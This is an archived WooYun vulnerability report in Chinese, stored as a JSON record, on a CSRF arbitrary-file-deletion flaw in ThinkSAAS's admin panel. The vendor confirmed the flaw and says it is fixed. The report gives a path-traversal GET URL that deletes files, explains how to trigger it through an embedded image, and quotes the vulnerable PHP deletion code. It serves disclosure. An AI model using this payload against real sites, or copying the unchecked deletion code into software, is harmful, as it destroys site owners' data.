{"id": 55565, "wybug_id": "wooyun-2014-060540", "wybug_title": "ThinkSAAS可CSRF删除任意文件 （后台）", "wybug_corp": "thinksaas.cn", "wybug_author": "BadCat", "wybug_date": "2014-05-15 12:48", "wybug_open_date": "2014-08-13 12:52", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向公众公开  简要描述： RT 详细说明：  POC : http://localhost/thinksaas/index.php?app=system&ac=sql&ts=delete&sql=../../CHANGELOG.TXT\ncase \"delete\":\t\t$sql = tsFilter($_GET['sql']);\t\trmrf('data/baksql/'.$sql);\t\tqiMsg('删除成功！如果有其他卷文件请一同删除!');\t\tbreak;\n没有做任何的检查而且tsFilter貌似是防止SQL注入的吧.....\n/** * 删除目录下所有文件 * @param unknown $dir */function rmrf($dir) {\tforeach ( glob ( $dir ) as $file ) {\t\tif (is_dir ( $file )) {\t\t\trmrf ( \"$file/*\" );\t\t\trmdir ( $file );\t\t} else {\t\t\tunlink ( $file );\t\t}\t}}\n删除目录下所有文件...太恐怖了....而且还是GET请求，可以很简单的造成CSRF插入个图片，网址为 ： http://localhost/thinksaas/index.php?app=system&ac=sql&ts=delete&sql=../../LICENSE.TXTLICENSE.TXT就被删除了...   漏洞证明：  这....我不懂怎么证明...   修复方案：  过滤 \n..\n 等字符话说这可以走大厂商吗?   版权声明：转载请注明来源 BadCat@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-05-15 13:24 厂商回复： 已经对官网和下载版本包进行了修复处理，感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}